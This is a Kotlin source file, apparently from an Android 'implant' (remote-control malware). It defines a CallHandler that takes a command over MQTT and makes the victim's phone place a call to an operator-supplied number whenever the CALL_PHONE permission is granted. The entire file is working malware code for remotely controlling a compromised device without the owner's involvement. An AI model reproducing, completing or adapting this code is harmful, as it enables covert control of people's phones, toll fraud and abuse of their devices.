package com.cooperthecoder.implant.command

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.support.v4.content.ContextCompat
import com.cooperthecoder.implant.command.handlers.CommandHandler
import org.eclipse.paho.android.service.MqttAndroidClient


class CallHandler(context: Context, client: MqttAndroidClient, command: Command): CommandHandler(context, client, command) {
    companion object {
        const val PREFIX = "tel:"
    }
    override fun action() {
        var phoneNumber = command.arguments["phone_number"]
        if (phoneNumber == null) {
            reply("", "Arguments: phone_number")
            return
        }

        if (! phoneNumber.startsWith(PREFIX)) {
            phoneNumber = "$PREFIX$phoneNumber"
        }

        val intent = Intent(Intent.ACTION_CALL)
        intent.setData(Uri.parse(phoneNumber))
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
            context.startActivity(intent)
        }
    }

}